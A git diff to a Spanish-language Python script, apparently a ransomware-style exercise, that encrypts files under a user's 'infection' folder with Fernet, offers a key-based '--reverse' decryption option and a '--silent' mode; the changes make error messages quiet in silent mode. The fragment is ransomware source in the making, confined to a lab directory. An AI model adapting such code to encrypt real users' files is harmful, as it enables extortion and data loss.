@@ -5,7 +5,6 @@
 #-----------------------------------------LIBRERIAS------------------------------------------------------
 
 import argparse
-from audioop import reverse
 import os
 from cryptography.fernet import Fernet
 
@@ -20,7 +19,6 @@ ruta = "/home/"+user+"/infection"
 #---------------------------------------CONFIGURACION----------------------------------------------------
 
 parser = argparse.ArgumentParser()
-#parser.add_argument('-h')
 parser.add_argument("-r", "--reverse", help = 'Desencripta todos los archivos con extensión ".ft"... Si tienes la clave adecuada claro', action = 'store_true', default = False)
 parser.add_argument('-v', '--version', action = 'version', version = 'beta 1.0', help = "Muestra la versión del programa, por si deseas actualizarlo")
 parser.add_argument('-s', '--silent', help = "Ejecuta el programa sin que salga nada por consola ﱲ", action= "store_true", default = False, dest = 'ninja')
@@ -80,9 +78,11 @@ def recuperar_key(user):
                     key = linea.split(':')[1].strip()[2:-1]
                     return key.encode()
                 else:
-                    print ("No hay usuarios con ese nombre registrados.")
+                    if not args.ninja:
+                        print ("No hay usuarios con ese nombre registrados.")
     except:
-        print ("No hay registros.")
+        if not args.ninja:
+            print ("No hay registros.")
 
 def codificar(lista, key):
     for elem in lista:
